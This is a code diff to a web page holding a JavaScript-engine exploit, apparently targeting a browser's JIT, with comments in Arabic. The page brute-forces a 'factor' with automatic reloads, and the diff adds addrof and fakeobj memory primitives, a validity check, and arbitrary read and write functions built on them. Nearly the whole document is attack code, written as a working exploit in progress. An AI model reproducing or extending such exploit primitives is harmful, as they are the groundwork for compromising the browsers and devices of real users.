@@ -56,32 +56,11 @@
             for (let i = 0; i < 1e6; ++i) {
                 get_getterSetter(i % 2);
             }
-            for (let i = 0; i < 1e6; ++i) {
-                get_getterSetter(i % 2);
-            }
-            for (let i = 0; i < 1e6; ++i) {
-                get_getterSetter(i % 2);
-            }
-            for (let i = 0; i < 1e6; ++i) {
-                get_getterSetter(i % 2);
-            }
-            for (let i = 0; i < 1e6; ++i) {
-                get_getterSetter(i % 2);
-            }
-            for (let i = 0; i < 1e6; ++i) {
-                get_getterSetter(i % 2);
-            }
-            for (let i = 0; i < 1e6; ++i) {
-                get_getterSetter(i % 2);
-            }
-            for (let i = 0; i < 1e6; ++i) {
-                get_getterSetter(i % 2);
-            }
             return [getter, get_getterSetter(1)];
         }
 
         function resetProgress() {
-            sessionStorage.removeItem('triedFactors'); // استخدام sessionStorage بدلاً من localStorage
+            sessionStorage.removeItem('triedFactors');
             document.getElementById("status").innerHTML = "Progress reset, reloading...";
             setTimeout(() => location.reload(), 1000);
         }
@@ -96,7 +75,7 @@
             }
             if (!success) {
                 document.getElementById("status").innerHTML = "Exploit failed.. Trying again!";
-                setTimeout(() => location.reload(), 1000); // إعادة تحميل تلقائي
+                setTimeout(() => location.reload(), 1000);
                 return;
             }
 
@@ -113,7 +92,7 @@
                 triedFactors.push(factor);
                 sessionStorage.setItem('triedFactors', JSON.stringify(triedFactors));
             } else {
-                factor = 87 + Math.floor(Math.random() * 1000); // إذا نفدت القيم، عودة إلى عشوائي
+                factor = 87 + Math.floor(Math.random() * 1000);
             }
 
             // طباعة القيمة المجربة
@@ -129,7 +108,9 @@
 
             function addrof(o) {
                 boxed_arr[8] = o;
-                return Int64.fromDouble(unboxed_arr[0]);
+                // محاولة التعامل مع NaN-boxing إذا لزم الأمر
+                let addr = Int64.fromDouble(unboxed_arr[0]);
+                return addr; // سيعود كائن Int64
             }
 
             function fakeobj(addr) {
@@ -137,19 +118,41 @@
                 return boxed_arr[8];
             }
 
-            let sample = BigInt(addrof({}).toString());
+            let testObj = { x: 0x1234 };
+            let addr = addrof(testObj);
+            let sample = BigInt(addr.toString());
             if (sample >= 0x200000000 || sample < 0x100000000) {
                 document.getElementById("status").innerHTML = "Failed with factor = " + factor + ". Trying again...";
-                setTimeout(() => location.reload(), 1000); // إعادة تحميل تلقائي
+                setTimeout(() => location.reload(), 1000);
                 return;
             } else {
-                alert("Success!!! factor = " + factor);
-                document.getElementById("status").innerHTML = "Success with factor = " + factor + "!";
-                alert(addrof({}).toString());
-                alert(addrof({}).toString());
-                alert(addrof({}).toString());
-                alert(addrof({}).toString());
-                sessionStorage.removeItem('triedFactors'); // إعادة تعيين بعد النجاح
+                // اختبار صحة addrof
+                let fake = fakeobj(addr);
+                if (fake.x === testObj.x) {
+                    alert("Success!!! factor = " + factor + " - addrof is valid!");
+                    document.getElementById("status").innerHTML = "Success with factor = " + factor + " - addrof valid!";
+                    alert("Address: " + addr.toString());
+                    alert("Address: " + addr.toString());
+                    alert("Address: " + addr.toString());
+                    alert("Address: " + addr.toString());
+
+                    // تطوير r/w
+                    function read(addr) {
+                        let fake = fakeobj(addr);
+                        return fake[0];
+                    }
+                    function write(addr, value) {
+                        let fake = fakeobj(addr);
+                        fake[0] = value;
+                    }
+                    alert("Read test: " + read(addrof({ x: 0x1234 })).toString());
+                    write(addrof({ x: 0x1234 }), 0x5678);
+                    alert("Write test: " + addrof({ x: 0x1234 }).x.toString());
+                } else {
+                    alert("Success!!! factor = " + factor + " - addrof may need adjustment!");
+                    document.getElementById("status").innerHTML = "Success with factor = " + factor + " - addrof questionable!";
+                }
+                sessionStorage.removeItem('triedFactors');
             }
         })();
     </script>
